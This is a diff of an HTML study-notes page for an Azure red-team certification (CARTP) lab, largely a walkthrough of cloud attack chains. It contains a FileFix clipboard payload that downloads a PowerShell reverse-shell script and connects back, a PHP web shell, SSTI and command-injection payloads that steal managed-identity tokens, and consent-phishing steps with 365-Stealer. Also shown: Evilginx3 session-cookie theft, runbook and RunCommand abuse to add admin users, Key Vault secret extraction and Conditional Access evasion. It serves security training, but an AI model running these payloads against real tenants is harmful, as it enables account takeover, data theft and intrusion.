@@ -21,31 +21,37 @@
     .about { max-width: 100% !important; padding: 20px 40px !important; }
     .notion-content { line-height: 1.6; }
     .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
-    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 30px 0 15px; }
+    .notion-content h1:first-child, .notion-content h2:first-child { margin-top: 0; }
     .notion-content p { margin: 15px 0; color: #d6d6d6; }
     .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
-    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content li { margin: 8px 0; color: #d6d6d6; }
     .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
     .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
     .notion-content a { color: #ffdb70; text-decoration: underline; }
     .notion-content strong { color: #fafafa; font-weight: 600; }
     .notion-content blockquote { background: #2a2a2a; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; color: #d6d6d6; }
     .notion-content > * { display: block !important; visibility: visible !important; opacity: 1 !important; }
-    .notion-content details { display: block !important; }
-    .notion-content details > * { display: block !important; visibility: visible !important; }
-    details[open] { display: block !important; }
+    .course-navigation { margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; }
+    .next-part { display: inline-block; padding: 12px 24px; background: #ffdb70; color: #1a1a1a; text-decoration: none; border-radius: 6px; font-weight: 600; transition: all 0.2s; }
+    .next-part:hover { background: #ffc107; }
   </style>
 </head>
 <body>
   <main>
     <aside class="sidebar" data-sidebar>
       <div class="sidebar-info">
-        <figure class="avatar-box"><img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80"></figure>
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
         <div class="info-content">
           <h1 class="name" title="Mr Stark">Mr Stark</h1>
           <p class="title">CARTP Study Notes</p>
         </div>
-        <button class="info_more-btn" data-sidebar-btn><span>Show Navigation</span><ion-icon name="chevron-down"></ion-icon></button>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
       </div>
       <div class="sidebar-info_more">
         <div class="separator"></div>
@@ -60,8 +66,13 @@
         <div class="separator"></div>
         <ul class="contacts-list">
           <li class="contact-item">
-            <div class="icon-box"><ion-icon name="arrow-back-outline"></ion-icon></div>
-            <div class="contact-info"><p class="contact-title">Back</p><a href="../../../" class="contact-link">Portfolio</a></div>
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
           </li>
         </ul>
       </div>
@@ -80,97 +91,64 @@
 
 <h2>Register an Application</h2>
 
-<p>First, register a new application in Entra ID: <code>Entra ID → Application Registrations → New Application</code></p>
+<p>First, register a new application in Entra ID: Entra ID → Application Registrations → New Application</p>
 
-<p>Give it any name (e.g., <code>student59</code>) and select <code>Accounts in any organizational directory (Any Entra ID directory - Multitenant)</code></p>
+<p>Give it any name (e.g., student59) and select Accounts in any organizational directory (Any Entra ID directory - Multitenant)</p>
 
-<img src="../../assets/cartp/image%2057.png" alt="Register Application">
+<p>Add a Redirection URL - this will redirect to a server that we as an attacker have control of.</p>
 
-<p>Add a Redirection URL - this will redirect to a server that we as an attacker have control of:</p>
+<p>Create a New Client Secret: Certificates & Secrets → New Client Secret</p>
 
-<img src="../../assets/cartp/image%2058.png" alt="Redirect URL">
-
-<p>Create a New Client Secret: <code>Certificates & Secrets → New Client Secret</code></p>
-
-<img src="../../assets/cartp/image%2060.png" alt="Client Secret">
-
-<p>Add API Permissions - <code>User.Read</code> & <code>User.ReadBasic.All</code>:</p>
-
-<img src="../../assets/cartp/image%2061.png" alt="API Permissions">
+<p>Add API Permissions - User.Read & User.ReadBasic.All:</p>
 
 <p>These permissions are carefully selected to request the absolute minimum privileges required without triggering an Administrator Consent prompt.</p>
 
 <h2>Setting Up 365-Stealer</h2>
 
-<p>We use the <strong>365-Stealer</strong> tool because it automates the complex technical backend required to execute the <strong>Illicit Consent Grant</strong> attack.</p>
+<p>We use the 365-Stealer tool because it automates the complex technical backend required to execute the Illicit Consent Grant attack.</p>
 
-<p>Start XAMPP and run Apache and MySQL. Ensure the '365-Stealer' directory is inside <code>C:\xampp\htdocs</code>.</p>
+<p>Start XAMPP and run Apache and MySQL. Ensure the '365-Stealer' directory is inside C:\xampp\htdocs.</p>
 
-<img src="../../assets/cartp/image%2063.png" alt="XAMPP">
-
-<p>Access 365-Stealer at <code>https://localhost:8443/365-stealer/yourVictims</code> and login with default credentials:</p>
-
+<p>Access 365-Stealer at https://localhost:8443/365-stealer/yourVictims and login with default credentials:</p>
 <ul>
-<li><strong>Username:</strong> admin</li>
-<li><strong>Password:</strong> Pass@123</li>
+<li>Username: admin</li>
+<li>Password: Pass@123</li>
 </ul>
-
-<img src="../../assets/cartp/image%2065.png" alt="365-Stealer Login">
 
 <p>Configure the tool with your registered application details:</p>
-
 <ul>
-<li><strong>Client ID:</strong> fbb6cfbd-95bf-486d-82f8-bc5bb6629e94</li>
-<li><strong>Client Secret:</strong> [REDACTED]</li>
-<li><strong>Redirect URL:</strong> https://172.16.150.59/login/authorized</li>
+<li>Client ID: [Your Client ID]</li>
+<li>Client Secret: [Your Client Secret]</li>
+<li>Redirect URL: https://172.16.150.59/login/authorized</li>
 </ul>
 
-<img src="../../assets/cartp/image%2066.png" alt="365-Stealer Config">
-
-<p>Click the green <code>Run 365-Stealer</code> button, keep port <code>443</code>, and ensure HTTPS is enabled.</p>
-
-<img src="../../assets/cartp/image%2067.png" alt="Run 365-Stealer">
+<p>Click the green Run 365-Stealer button, keep port 443, and ensure HTTPS is enabled.</p>
 
 <h2>Getting the Phishing Link</h2>
 
-<p>Access <code>https://localhost</code> in Incognito mode and click "Read More" on the Phishing Microsoft Page. Copy that link and send it to your victim.</p>
-
-<img src="../../assets/cartp/image%2069.png" alt="Phishing Page">
+<p>Access https://localhost in Incognito mode and click "Read More" on the Phishing Microsoft Page. Copy that link and send it to your victim.</p>
 
 <p>The link will look like:</p>
 
 <pre><code>https://login.microsoftonline.com/common/oauth2/authorize?client_id=...</code></pre>
 
-<img src="../../assets/cartp/image%2070.png" alt="Phishing Link">
-
 <h2>Getting Admin Consent</h2>
 
-<p>We engage the Get Admin Consent phase because we have hit the ceiling of what we can achieve with a standard user. Before this phase we effectively possess the digital rights of a regular employee.</p>
+<p>We engage the Get Admin Consent phase because we have hit the ceiling of what we can achieve with a standard user.</p>
 
-<p>The transition to Get Admin Consent involves modifying our application to ask for restricted high-privilege scopes. We add permissions like <code>Mail.Read</code> and <code>Files.ReadWrite</code> which are so dangerous that Microsoft blocks standard users from consenting to them.</p>
-
-<img src="../../assets/cartp/image%2077.png" alt="Admin Consent Permissions">
+<p>The transition to Get Admin Consent involves modifying our application to ask for restricted high-privilege scopes. We add permissions like Mail.Read and Files.ReadWrite which are so dangerous that Microsoft blocks standard users from consenting to them.</p>
 
 <p><strong>Delegated Permissions to request:</strong></p>
-
 <ul>
-<li><strong>Files.ReadWrite.All:</strong> Access the Administrator's OneDrive and SharePoint</li>
-<li><strong>Mail.Read:</strong> Read the administrator's emails</li>
-<li><strong>User.ReadWrite.All:</strong> Modify user accounts</li>
-<li><strong>Directory.ReadWrite.All:</strong> Modify directory settings</li>
+<li>Files.ReadWrite.All: Access the Administrator's OneDrive and SharePoint</li>
+<li>Mail.Read: Read the administrator's emails</li>
+<li>User.ReadWrite.All: Modify user accounts</li>
+<li>Directory.ReadWrite.All: Modify directory settings</li>
 </ul>
 
 <p>Generate a new link and send it to an Administrator (e.g., Mark Walden).</p>
 
-<img src="../../assets/cartp/image%2078.png" alt="Spear Phishing">
-
 <p>Once the admin clicks and authorizes, we have their token with high privileges!</p>
-
-<img src="../../assets/cartp/image%2079.png" alt="Admin Consent Success">
-
-<p>Now we can enumerate their OneDrive and download files:</p>
-
-<img src="../../assets/cartp/image%2080.png" alt="OneDrive Files">
 
 <h2>Getting Reverse Shell</h2>
 
@@ -180,20 +158,15 @@
 
 <pre><code>python 365-Stealer.py --refresh-user 'MarkDWalden@defcorphq.onmicrosoft.com' --upload 'C:\student59.doc'</code></pre>
 
-<img src="../../assets/cartp/image%2081.png" alt="Upload Malicious File">
-
 <h2>Sending Emails as Mark</h2>
 
-<p>Since we have Mark's token, we can also send emails as Mark using 365-Stealer:</p>
-
-<img src="../../assets/cartp/image%2083.png" alt="Send Email">
+<p>Since we have Mark's token, we can also send emails as Mark using 365-Stealer.</p>
 
 <h1>FileFix Remote Code Execution</h1>
 
-<p><strong>FileFix</strong> is a social-engineering technique that tricks users into copying and pasting malicious commands into the File Explorer address bar. It requires no exploits, no admin rights, and no external tools.</p>
+<p>FileFix is a social-engineering technique that tricks users into copying and pasting malicious commands into the File Explorer address bar. It requires no exploits, no admin rights, and no external tools.</p>
 
-<p><strong>The attack flow:</strong></p>
-
+<p>The attack flow:</p>
 <ol>
 <li>The attacker sets up a phishing page that looks like an internal company file portal.</li>
 <li>The page tells the victim to copy a file path and paste it into File Explorer's address bar.</li>
@@ -201,27 +174,21 @@
 <li>When the user pastes and presses Enter, PowerShell runs in the background.</li>
 </ol>
 
-<img src="../../assets/cartp/image%2085.png" alt="FileFix Page">
-
 <p>The key is the JavaScript that copies the malicious command instead of the file path:</p>
 
 <pre><code>navigator.clipboard.writeText(`powershell.exe -WindowStyle Hidden -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://172.16.1.59:82/Invoke-PowerShellTcp.ps1'); Power -Reverse -IPAddress 172.16.1.59 -Port 4444" # C:\\Defense Corporation\\internal-secure\\filedrive\\SecurityAudit_Report.docx`)</code></pre>
 
-<img src="../../assets/cartp/image%2086.png" alt="FileFix Attack">
-
-<p>Send the malicious link to the victim via email:</p>
-
-<img src="../../assets/cartp/image%2087.png" alt="Send Phishing Email">
+<p>Send the malicious link to the victim via email.</p>
 
 <h1>Initial Access - App Service Abuse (Insecure File Upload)</h1>
 
-<p>Azure App Service is a Platform-as-a-Service (PaaS) offering. In this lab, the <code>defcorphqcareer</code> site is hosted on this platform.</p>
+<p>Azure App Service is a Platform-as-a-Service (PaaS) offering. In this lab, the defcorphqcareer site is hosted on this platform.</p>
 
 <p>If the developer created a feature to upload resumes but failed to validate the file type properly, we can upload an executable script.</p>
 
 <h2>The Identity Vector: Managed Identities (MSI)</h2>
 
-<p>The most critical concept is the <strong>Managed Identity</strong>. The <code>defcorphqcareer</code> application is assigned a unique Managed Identity.</p>
+<p>The most critical concept is the Managed Identity. The defcorphqcareer application is assigned a unique Managed Identity.</p>
 
 <p>Upload a PHP web shell:</p>
 
@@ -229,17 +196,13 @@
 system($_REQUEST['cmd']);
 ?&gt;</code></pre>
 
-<p>Upload as <code>studentxshell.phtml</code></p>
-
-<img src="../../assets/cartp/image%2088.png" alt="File Upload">
+<p>Upload as studentxshell.phtml</p>
 
 <p>Access the shell:</p>
 
 <pre><code>https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env</code></pre>
 
-<img src="../../assets/cartp/image%2089.png" alt="Web Shell">
-
-<p>Look for <code>IDENTITY_HEADER</code> and <code>IDENTITY_ENDPOINT</code> environment variables!</p>
+<p>Look for IDENTITY_HEADER and IDENTITY_ENDPOINT environment variables!</p>
 
 <h2>Harvesting the Cloud Token</h2>
 
@@ -249,8 +212,6 @@ system($_REQUEST['cmd']);
 system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
 ?&gt;</code></pre>
 
-<img src="../../assets/cartp/image%2090.png" alt="Token Harvesting">
-
 <h2>Privilege Escalation and Lateral Movement</h2>
 
 <p>Use the token with Az PowerShell:</p>
@@ -259,38 +220,28 @@ system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-
 Connect-AzAccount -AccessToken $token -AccountID '064aaf57-30af-41f0-840a-0e21ed149946'
 Get-AzRoleAssignment</code></pre>
 
-<img src="../../assets/cartp/image%2091.png" alt="Az PowerShell">
-
 <p>List subscriptions:</p>
 
 <pre><code>$URI = 'https://management.azure.com/subscriptions?api-version=2025-04-01'
 (Invoke-RestMethod -Method GET -Uri $URI -Headers @{Authorization="Bearer $Token"}).value</code></pre>
-
-<img src="../../assets/cartp/image%2092.png" alt="List Subscriptions">
 
 <p>List resources:</p>
 
 <pre><code>$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2025-04-01'
 (Invoke-RestMethod -Method GET -Uri $URI -Headers @{Authorization="Bearer $Token"}).value</code></pre>
 
-<img src="../../assets/cartp/image%2093.png" alt="List Resources">
-
 <p>Check permissions on a specific VM:</p>
 
 <pre><code>$URI = 'https://management.azure.com/subscriptions/.../resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2022-04-01'
 (Invoke-RestMethod -Method GET -Uri $URI -Headers @{Authorization="Bearer $Token"}).value</code></pre>
 
-<img src="../../assets/cartp/image%2094.png" alt="Check Permissions">
-
-<p>It confirms our identity has <code>Microsoft.Compute/virtualMachines/runCommand/action</code> privileges - we can execute commands on the VM!</p>
+<p>It confirms our identity has Microsoft.Compute/virtualMachines/runCommand/action privileges - we can execute commands on the VM!</p>
 
 <h1>Initial Access - Server Side Template Injection (SSTI)</h1>
 
 <p>SSTI occurs when a web application concatenates user input directly into a template file. In Azure, this is effectively a "golden key" vulnerability because it allows us to execute OS commands on the backend container.</p>
 
-<p>Target: <code>https://vaultfrontend.azurewebsites.net/</code></p>
-
-<img src="../../assets/cartp/image%2095.png" alt="Vault Frontend">
+<p>Target: https://vaultfrontend.azurewebsites.net/</p>
 
 <h2>Identifying the Vulnerability</h2>
 
@@ -298,9 +249,7 @@ Get-AzRoleAssignment</code></pre>
 
 <pre><code>{{7*7}}</code></pre>
 
-<img src="../../assets/cartp/image%2097.png" alt="SSTI Test">
-
-<p>If it returns <code>49</code>, the app is vulnerable!</p>
+<p>If it returns 49, the app is vulnerable!</p>
 
 <h2>Identify Template Engine</h2>
 
@@ -308,15 +257,11 @@ Get-AzRoleAssignment</code></pre>
 
 <pre><code>{{7*'7'}}</code></pre>
 
-<img src="../../assets/cartp/image%2098.png" alt="Engine Detection">
-
-<p>Output shows multiple 7s - this is <strong>Python Jinja2</strong>!</p>
+<p>Output shows multiple 7s - this is Python Jinja2!</p>
 
 <p>Get configuration:</p>
 
 <pre><code>{{config.items()}}</code></pre>
-
-<img src="../../assets/cartp/image%2099.png" alt="Config Items">
 
 <h2>From Code Execution to Identity Theft</h2>
 
@@ -324,19 +269,13 @@ Get-AzRoleAssignment</code></pre>
 
 <pre><code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code></pre>
 
-<img src="../../assets/cartp/image%20100.png" alt="RCE">
-
 <p>Get environment variables including Managed Identity tokens:</p>
 
 <pre><code>{{config.__class__.__init__.__globals__['os'].popen('env').read()}}</code></pre>
 
-<img src="../../assets/cartp/image%20101.png" alt="Environment">
-
 <p>Request access token:</p>
 
 <pre><code>{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com" -H secret:$IDENTITY_HEADER').read()}}</code></pre>
-
-<img src="../../assets/cartp/image%20102.png" alt="Get Token">
 
 <h2>Accessing the Vault</h2>
 
@@ -344,22 +283,19 @@ Get-AzRoleAssignment</code></pre>
 
 <pre><code>Connect-AzAccount -AccessToken $token -AccountId '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'</code></pre>
 
-<p>Enumerate permissions - discover the app has access to <strong>ResearchKeyVault</strong>!</p>
+<p>Enumerate permissions - discover the app has access to ResearchKeyVault!</p>
 
 <p>This completes the kill chain: web vulnerability → cloud identity compromise → Key Vault access!</p>
 
 <h1>Initial Access - OS Command Injection</h1>
 
-<p>In Azure PaaS services like App Services, OS Command Injection is effectively a mechanism for Identity Theft. The exploit allows us to communicate with the <strong>Azure Instance Metadata Service (IMDS)</strong> from within the trusted boundary.</p>
+<p>In Azure PaaS services like App Services, OS Command Injection is effectively a mechanism for Identity Theft. The exploit allows us to communicate with the Azure Instance Metadata Service (IMDS) from within the trusted boundary.</p>
 
-<p>Target: <code>https://virusscanner.azurewebsites.net/</code></p>
-
-<img src="../../assets/cartp/image%20103.png" alt="Virus Scanner">
+<p>Target: https://virusscanner.azurewebsites.net/</p>
 
 <p>The app has a URL scanner feature that's vulnerable to command injection.</p>
 
 <h2>Chaining Commands</h2>
-
 <ul>
 <li><code>;</code> - Execute multiple commands sequentially</li>
 <li><code>&&amp;</code> - Execute second command only if first succeeds</li>
@@ -369,15 +305,13 @@ Get-AzRoleAssignment</code></pre>
 
 <p>Test for injection:</p>
 
-<pre><code>&amp;&amp;id&amp;&amp;</code></pre>
+<pre><code>&&amp;id&amp;&amp;</code></pre>
 
-<img src="../../assets/cartp/image%20106.png" alt="Command Injection">
-
-<p>We get <code>uid=1000(app)</code> - we're running as the app service user!</p>
+<p>We get uid=1000(app) - we're running as the app service user!</p>
 
 <p>Get environment variables:</p>
 
-<p>Look for <code>IDENTITY_HEADER</code> and <code>IDENTITY_ENDPOINT</code></p>
+<p>Look for IDENTITY_HEADER and IDENTITY_ENDPOINT</p>
 
 <h2>Stealing Tokens</h2>
 
@@ -399,51 +333,310 @@ print("ClientID: "+json.loads(val)["client_id"])</code></pre>
 
 <pre><code>http://localhost&amp;&amp;python /tmp/uploads/student59/student59.py&amp;&amp;</code></pre>
 
-<img src="../../assets/cartp/image%20109.png" alt="Token Extraction">
-
 <p>We successfully retrieved both ARM (Management API) and Graph API Tokens!</p>
 
-<h1>Lateral Movement - Pass-the-PRT & Intune</h1>
+<h1>Lateral Movement - Cloud to On-Premises (Hybrid Worker Abuse)</h1>
 
-<h3>Primary Refresh Token Extraction</h3>
+<p>This is one of the most critical phases in a cloud red team engagement. We are effectively breaking the "air gap" between the internet-facing cloud tenant and the highly restricted internal corporate network.</p>
+
+<p>We achieve this not by exploiting a software bug, but by abusing a legitimate administrative channel that enterprises use to manage their servers.</p>
+
+<p>We start this lab with access to Admin-Consent EndPoint from Mark's phishing campaign that led to reverse shell.</p>
+
+<p>We will abuse the fact that Mark's OneDrive is synced to his computer, which give us the possibility to upload the malicious file and once the OneDrive sync locally and download the file to his computer and he tries to open the malicious .doc file a reverse shell connection is initiated from Mark's endpoint.</p>
+
+<h2>Discovery of Privileged Entra ID Group Ownership</h2>
+
+<p>Once we possess Mark's valid authentication token, we switch to reconnaissance within the Directory. We perform a specific query to identify "Owned Objects."</p>
+
+<pre><code>az ad signed-in-user show</code></pre>
+
+<p>We identify that Mark Walden is listed as the Owner of a specific Entra ID Security Group (likely named "Automation Admins" or similar).</p>
+
+<p>Being an owner gives us the right to modify the membership.</p>
+
+<pre><code>az ad signed-in-user list-owned-objects</code></pre>
+
+<p>Find the Group ID and check members:</p>
+
+<pre><code>$GroupID = "e6870783-1378-4078-b242-84c08c6dc0d7"
+$URI = "https://graph.microsoft.com/v1.0/groups/$GroupID/members"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{
+        'Authorization' = "Bearer $Graph_Token" 
+    }
+}
+$Members = (Invoke-RestMethod @RequestParams).value
+$Members | Select-Object displayName, userPrincipalName, id</code></pre>
+
+<p>If not a member, add yourself:</p>
+
+<pre><code>Connect-MgGraph -AccessToken ($Graph_Token | ConvertTo-SecureString -AsPlainText -Force)
+$params = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3" }
+New-MgGroupMember -GroupId $GroupID -BodyParameter $params</code></pre>
+
+<h2>Enumerating Automation Accounts</h2>
+
+<pre><code>az automation account list</code></pre>
+
+<p>The output confirms that the "Automation Admins" group we joined possesses valid RBAC permissions over the Azure subscription.</p>
+
+<p>The most critical piece of intelligence is the specific name of the account, <strong>"HybridAutomation"</strong>.</p>
+
+<p>A resource named "Hybrid" indicates the presence of <strong>Hybrid Runbook Workers</strong>, meaning this automation account is running scripts on on-premises servers.</p>
+
+<h2>Checking Hybrid Worker</h2>
+
+<pre><code>Get-AzAutomationHybridWorkerGroup -AutomationAccountName 'HybridAutomation' -ResourceGroupName 'Engineering'</code></pre>
+
+<ul>
+<li><strong>Name: Workergroup1</strong>: This is the specific routing address for our attack.</li>
+<li><strong>GroupType: User</strong>: Confirms it's active.</li>
+</ul>
+
+<pre><code>Get-AzAutomationHybridRunbookWorker -AutomationAccountName 'HybridAutomation' -ResourceGroupName 'Engineering' -HybridRunbookWorkerGroupName 'Workergroup1' | Format-List</code></pre>
+
+<p>Confirm the on-premises server (e.g., defeng-adcsrv at 172.16.1.20) is online.</p>
+
+<h2>Staging the Malware (Import and Publish)</h2>
+
+<pre><code>Import-AzAutomationRunbook -Name student59 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose</code></pre>
+
+<pre><code>Publish-AzAutomationRunbook -RunbookName student59 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose</code></pre>
+
+<h2>The Execution Trigger (Lateral Movement)</h2>
+
+<pre><code>Start-AzAutomationRunbook -RunbookName student59 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose</code></pre>
+
+<p>This caused the internal DEFENG-ADCSRV server to reach out through the corporate firewall, pull down our malicious job, and execute it as a trusted system maintenance task.</p>
+
+<h1>Lateral Movement - Managed Identity Abuse - RunCommand Exploit</h1>
+
+<p>The concept of Managed Identity Privilege Abuse relies on the understanding that in Azure, permissions are rarely granted to users directly but rather to the non-human identities associated with resources like Web Apps.</p>
+
+<p>When you exploit the initial App Service (via Command Injection or File Upload), the extraction of the Access Token allows you to masquerade as that application.</p>
+
+<p>The critical failure is <strong>Over-Privileging</strong>. The administrators assigned the <strong>Virtual Machine Command Executor</strong> (or Contributor) role to the Web App's identity.</p>
+
+<h2>Abusing FileUpload Vulnerability</h2>
+
+<p>Upload a PHP shell to extract the ARM token:</p>
+
+<pre><code>&lt;?php
+system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?&gt;</code></pre>
+
+<h2>Connect as the Managed Identity</h2>
+
+<pre><code>$ARM_Access_Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1…"
+Connect-AzAccount -AccessToken $ARM_Access_Token -AccountId "064aaf57-30af-41f0-840a-0e21ed149946"</code></pre>
+
+<h2>Network Enumeration</h2>
+
+<pre><code>Get-AzVM | Select-Object Name, ResourceGroupName</code></pre>
+
+<pre><code>Get-AzNetworkInterface -Name "bkpadconnect368"</code></pre>
+
+<pre><code>Get-AzPublicIpAddress -Name 'bkpadconnectIP' | Format-List</code></pre>
+
+<h2>Add User to VM</h2>
+
+<pre><code>$passwd = ConvertTo-SecureString "Stud59Password@123" -AsPlainText -Force
+New-LocalUser -Name student59 -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member student59</code></pre>
+
+<pre><code>Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose</code></pre>
+
+<h2>Establishing the Connection</h2>
+
+<pre><code>$Password = ConvertTo-SecureString 'Stud59Password@123' -AsPlainText -Force
+$Creds = New-Object System.Management.Automation.PSCredential('student59', $Password)
+$Session = New-PSSession -ComputerName 20.52.148.232 -Credential $Creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $Session</code></pre>
+
+<p>We received a connection on our Netcat listener from the internal IP. When we ran <code>whoami</code>, the system responded with <code>nt authority\system</code>, which is the highest possible privilege level on a Windows machine.</p>
+
+<h1>Lateral Movement - Key Vault Abuse & Scoped Privileges</h1>
+
+<h2>Management Plane vs. Data Plane Token Acquisition</h2>
+
+<p>We must understand that not all Access Tokens are created equal. In previous labs, we primarily requested tokens for the <strong>Management Plane</strong> (<code>management.azure.com</code>). This specific scope grants us the permission to perform "Control" actions.</p>
+
+<p>However, possessing a Management token does not automatically grant access to the actual data stored inside those resources. To read a secret inside a Key Vault, we must request a specific <strong>Data Plane</strong> token (e.g., scoped to <code>https://vault.azure.net</code>).</p>
+
+<p>We effectively have to ask the <strong>Azure Instance Metadata Service</strong> (IMDS) twice: once for the keys to the office (Management) and once for the keys to the filing cabinet (Data).</p>
+
+<h2>Demonstration - Extracting Secrets from Key Vault</h2>
+
+<p>Return to the VaultFrontEnd application where we previously identified the SSTI vulnerability.</p>
+
+<p>Access: https://vaultfrontend.azurewebsites.net/</p>
+
+<h3>ARM Token</h3>
+
+<pre><code>{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}</code></pre>
+
+<h3>Vault Token</h3>
+
+<pre><code>{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}</code></pre>
+
+<h3>Token Injection and Authentication</h3>
+
+<pre><code>$ARM_Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJ..."
+$Vault_Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1Ni..."
+Connect-AzAccount -AccessToken $ARM_Token -KeyVaultAccessToken $Vault_Token -AccountId "2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc"</code></pre>
+
+<h3>Enumerating Key Vaults</h3>
+
+<pre><code>Get-AzKeyVault</code></pre>
+
+<p>The output confirms the existence of the <strong>ResearchKeyVault</strong> in the "Research" resource group.</p>
+
+<h3>Extracting Secrets</h3>
+
+<pre><code>Get-AzKeyVaultSecret -VaultName "ResearchKeyVault"</code></pre>
+
+<pre><code>Get-AzKeyVaultSecret -VaultName "ResearchKeyVault" -Name "Reader" -AsPlainText</code></pre>
+
+<p>We successfully extracted: <code>Hav3Y0uLooked@KeyVault!!K4thY</code></p>
+
+<h1>Requesting User's Token (MFA & Policy Evasion)</h1>
+
+<p>We possess credentials for a user, but <strong>Conditional Access Policies</strong> are likely active. These policies block "Legacy Authentication" or non-interactive PowerShell scripts.</p>
+
+<h2>Option 1: Portal-Based Token Extraction</h2>
+
+<p>This is a "Living off the Land" technique:</p>
+<ol>
+<li>Open a Private/Incognito browser window and navigate to portal.azure.com</li>
+<li>Log in manually using the user's credentials</li>
+<li>Open Developer Tools (F12) → Application tab</li>
+<li>Find the access token in Cookies or Local Storage</li>
+</ol>
+
+<h2>Option 2: Device Code Flow</h2>
+
+<p>We choose Device Code Flow because it provides <strong>Persistence</strong>. When we complete the Device Code login, PowerShell receives a <strong>Refresh Token</strong>, not just an Access Token.</p>
+
+<pre><code>az login --tenant defcorphq.onmicrosoft.com --scope https://graph.microsoft.com/.default</code></pre>
+
+<p>This means our session will automatically renew itself for days.</p>
+
+<h1>Lateral Movement - Phishing - Evilginx3</h1>
+
+<p>We transition from reconnaissance into active exploitation targeting a specific administrator. We determined that Roy G. Cain holds the administrative keys for the Control Unit.</p>
+
+<p>We will overcome the MFA barrier by launching an Adversary-in-the-Middle attack using Evilginx3 to create a fake login page.</p>
+
+<p>We set up this specialized server to intercept the web traffic in real time so we can capture the session cookie immediately after Roy authenticates.</p>
+
+<p>This digital cookie acts like a temporary identification card that proves he has already finished the security checks.</p>
+
+<h2>My Staff Portal - Password Reset</h2>
+
+<p>We import the stolen cookie into our own web browser to trick the Microsoft platform into believing we are the legitimate user.</p>
+
+<p>We navigate to the My Staff portal where we can reset the password for the account that controls the JumpVM.</p>
+
+<h1>Privilege Escalation - ARM Templates - Deployment History</h1>
+
+<h2>Service Principal Authentication Mechanics</h2>
+
+<p>We must understand the difference between logging in as a human user versus a Service Principal. Humans are protected by MFA, but a Service Principal is a "Robot Account" used by applications.</p>
+
+<p>Service Principals rely exclusively on a "Client ID" (Username) and a "Client Secret" (Password). The strategic importance is that Service Principals act as a backdoor because they <strong>inherently bypass MFA</strong>.</p>
+
+<pre><code>Connect-AzAccount -ServicePrincipal -ClientId <app-id> -ClientSecret <secret> -Tenant <tenant-id></code></pre>
+
+<h2>Conditional Access Policy Evasion via User-Agent Spoofing</h2>
+
+<p>One of the most advanced defensive layers is Conditional Access Policies (CAPs). These are "If/Then" rules.</p>
+
+<p>We can evade CAPs by setting a specific User-Agent string that matches an approved device type:</p>
+
+<pre><code>Invoke-WebRequest -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers @{Authorization="Bearer $token"} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</code></pre>
+
+<h1>Privilege Escalation - Function App - Continuous Deployment</h1>
+
+<p>If we have write access to a Function App's configuration or deployment settings, we can modify the code that runs in it.</p>
+
+<p>Use Az PowerShell to update the function app:</p>
+
+<pre><code>Set-AzWebApp -ResourceGroupName "Name" -Name "FunctionAppName" -AppSettings @{"WEBSITE_RUN_FROM_PACKAGE"="1"}</code></pre>
+
